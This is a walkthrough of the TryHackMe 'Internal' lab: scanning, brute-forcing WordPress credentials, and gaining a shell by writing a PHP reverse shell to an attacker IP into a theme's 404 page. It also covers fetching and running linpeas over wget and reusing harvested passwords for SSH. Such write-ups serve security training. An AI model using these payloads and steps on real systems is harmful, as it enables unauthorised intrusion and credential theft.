# Internal

**Room Link:** [https://tryhackme.com/room/internal](https://tryhackme.com/room/internal)



## Scanning

### Initial Scan

<pre><code><strong>nmap -A 10.10.46.54
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

<pre><code><strong>nmap -p- 10.10.46.54
</strong></code></pre>

### TCP/80 - HTTP

```
gobuster dir -u http://10.10.46.54 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 30

```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Wordpress is running under both /blog and /wordpress. /blog has a login page

```
wpscan --url http://10.10.46.54
wpscan --url http://10.10.46.54/blog --passwords /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

#### Credentials found

<pre><code><strong>Username: admin 
</strong><strong>Password: my2boys
</strong></code></pre>

Trying to login the page redirects to internal.htm so I add that to the host file.

```
vi /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

We are able to successfully get into wordpress with the credentials

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Reverse Shell Failed Attempt

revshell.php code

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.120.18/443 0>&1'");
?>
```

```
vi revshell.php
zip revshell.zip revshell.php
nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Unable to upload the plugin due to write issues

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### Reverse Shell

TWENTY SEVENTEEN theme had a writable pages so I modified the 404 page with a reverse shell and then navigated to a page that does not exist.

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Just added the revshell.php code mentioned earlier.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 443
```

**Browser**

A page that doesn't exist to trigger the reverse shell.

```
http://www.internal.thm/blog/index.php/2020/08/03/hello-worlgd/
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Get full TTY shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

### LinPeas

**Kali**

```
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
wget http://10.10.120.18:81/linpeas.sh
chmod +x linpeas.sh 
./linpeas.sh
```

Linpeas was able to find two sets of credentials. phpmyadmin credentials worked.

```
phpmyadmin
Username: phpmyadmin                                                                                                                
Password: B2Ud4fEOZmVq

note 
Username: aubreanna
Password: bubb13guM!@#123
```

The note for Bill

```
cat /opt/wp-save.txt 
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Able to ssh in with the credentials. There is a file that says that Jenkins is running and we can confirm that is is running with netstat as well.

```
ssh aubreanna@10.10.46.54
cat jenkins.txt
netstat -tuan
```

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>



```
```

